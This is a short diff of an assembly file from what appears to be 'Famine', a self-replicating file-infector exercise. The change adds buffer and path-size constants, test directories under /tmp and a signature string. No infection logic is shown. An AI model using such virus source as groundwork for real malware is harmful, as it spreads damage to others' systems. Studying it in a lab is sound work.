@@ -33,12 +33,12 @@
 ; %define PROG_SIZE               _end - main
 ; %define JMP_OFFSET              jump - main
 ; %define SIGNATURE_SIZE          _end - signature
-%define BUFFER_SIZE     4096
-; %define READ_DIR_BUFF_SIZE      256
-; %define PROCESS_PATH_LEN        100
-; %define PROCESS_STATUS_READ_SIZE 20
-; %define WAIT_FORK_OPTION 14
-
+%define BUFFER_SIZE               4096
+%define READ_DIR_BUFF_SIZE        256
+%define PROCESS_PATH_LEN          100
+%define PROCESS_STATUS_READ_SIZE  20
+%define PATH_BUFF_SIZE            4096
+%define STDOUT                    1
 
 
 
@@ -121,4 +121,5 @@ firstDir:       db "/tmp/test", 0
 secondDir:      db "/tmp/test2", 0
 signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>"
 signature_len:  equ $ - signature - 1
-_end:
+
+the_end:        db "This is the end my friend, my only friend the end", 0
